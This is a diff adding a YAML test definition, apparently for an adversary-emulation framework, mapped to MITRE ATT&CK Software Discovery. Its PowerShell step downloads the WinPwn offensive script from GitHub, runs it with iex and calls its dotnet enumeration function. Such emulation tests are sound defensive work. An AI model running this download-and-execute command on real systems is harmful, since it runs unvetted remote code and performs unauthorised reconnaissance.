@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: WinPwn - DotNet
+description: Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.
+uuid: 10ba02d0-ab76-4f80-940d-451633f24c5b
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1518: Software Discovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---dotnet
+      inline: |-
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+        dotnet -consoleoutput -noninteractive
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
